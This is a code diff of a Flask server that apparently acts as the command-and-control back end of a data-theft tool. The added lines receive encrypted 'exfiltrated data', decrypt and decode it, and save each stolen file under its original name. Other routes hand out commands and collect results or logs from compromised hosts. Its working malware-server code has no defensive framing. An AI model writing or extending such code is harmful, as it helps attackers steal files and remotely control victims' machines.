@@ -1,6 +1,6 @@
 from flask import Flask, request, jsonify
 import base64
-
+import json
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding
@@ -86,7 +86,22 @@ def upload():
         try:
             decrypted_data = undo_everything(encrypted_data)
             print("Received exfiltrated data:")
-            print(decrypted_data)
+            decrypted_data = json.loads(decrypted_data)
+            print(decrypted_data) # data = { "file_name": os.path.basename(file_path), "file_size": len(file_data), "data": data }
+            #save file to receivedFiles folder
+            file_data = decrypted_data["data"]
+            # this is in string format, so we need to decode it
+            file_data = base64.b64decode(file_data)
+
+            file_name = decrypted_data["file_name"]
+            file_path = os.path.join("./receivedFiles", file_name)
+            try:
+                with open(file_path, "wb") as f:
+                    f.write(file_data)
+                    print(f"File saved to {file_path}")
+            except Exception as e:
+                print(f"Error saving file {file_name}: {e}")
+
         except Exception as e:
             print("Error processing exfiltrated data:", e)
         return jsonify({"status": "success"}), 200
@@ -109,16 +124,16 @@ def get_command():
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
-@app.route('/result', methods=['POST'])
-def result():
-    secret_res = request.form.get('data')
-    if secret_res:
-        res = undo_everything(secret_res)
-        print("Received command execution result:")
-        print(res)
-        return jsonify({"status": "result received"}), 200
+
+@app.route('/log', methods=['POST'])
+def log():
+    log_data = request.form.get('data')
+    if log_data:
+        log_data = undo_everything(log_data)
+        print(f"Received log : {log_data}")
+        return jsonify({"status": "log received"}), 200
     else:
-        return jsonify({"status": "no result received"}), 400
+        return jsonify({"status": "no log data received"}), 400
 
 if __name__ == '__main__':
     # Run over HTTPS with cert.pem and key.pem in the same directory.
